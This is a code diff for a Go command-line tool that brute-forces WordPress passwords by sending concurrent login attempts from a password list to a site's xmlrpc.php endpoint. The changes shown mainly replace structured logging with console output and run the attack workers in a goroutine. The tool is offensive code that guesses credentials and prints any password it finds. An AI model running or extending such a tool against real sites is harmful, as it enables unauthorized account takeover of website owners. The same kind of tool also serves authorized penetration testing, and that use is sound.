@@ -4,7 +4,6 @@ import (
 	"errors"
 	"flag"
 	"fmt"
-	"log/slog"
 	"os"
 )
 
@@ -23,7 +22,7 @@ func parseCommandlineArgs() (*CommandLineArgs, error) {
 	flag.Parse()
 
 	if *url == "" {
-		return nil, errors.New("website url missing.")
+		return nil, errors.New("website url missing")
 	}
 
 	args := &CommandLineArgs{
@@ -37,7 +36,6 @@ func parseCommandlineArgs() (*CommandLineArgs, error) {
 }
 
 func run() error {
-	logger := slog.New(slog.NewJSONHandler(os.Stdout, nil))
 	args, err := parseCommandlineArgs()
 	if err != nil {
 		return err
@@ -47,7 +45,6 @@ func run() error {
 	if err != nil {
 		return fmt.Errorf("failed to read passwords file: %w", err)
 	}
-	defer close(pwdChan)
 
 	url := fmt.Sprintf("%s/xmlrpc.php", args.Url)
 	results := make(chan Result)
@@ -55,19 +52,18 @@ func run() error {
 	executor := &Executor{
 		Url:        url,
 		MaxWorkers: args.MaxWorkers,
-		Logger:     logger,
 	}
-	executor.Run(args.Username, pwdChan, results)
+	go executor.Run(args.Username, pwdChan, results)
 
 	attempts := 1
 	for {
 		result := <-results
-		logger.Info("num password Attempt", "attempts", attempts)
+		fmt.Printf("[!] num password attempts: %d\r", attempts)
 		attempts++
 
 		if result.Success {
 			fmt.Println()
-			logger.Info("password Found", "password", result.Password)
+			fmt.Printf("[!] password found: %s\n", result.Password)
 			break
 		}
 	}
@@ -84,7 +80,6 @@ func main() {
 
 type Executor struct {
 	Url        string
-	Logger     *slog.Logger
 	MaxWorkers int
 }
 
@@ -93,7 +88,7 @@ func (e *Executor) Run(
 	passwords <-chan string,
 	results chan<- Result,
 ) {
-	e.Logger.Info("initiating Requests")
+	fmt.Printf("[!] initiating requests \n")
 	sem := make(chan int, e.MaxWorkers)
 
 	for password := range passwords {
@@ -101,11 +96,9 @@ func (e *Executor) Run(
 
 		go func(creds *Credentials) {
 			sem <- 1
-
-			e.Logger.Info("sending out request")
 			result, err := attemptLogin(e.Url, credentials)
 			if err != nil {
-				e.Logger.Error("failed to attempt login", "error", err.Error())
+				fmt.Printf("[!] failed to attempt login: %s\n", err.Error())
 				return
 			}
 
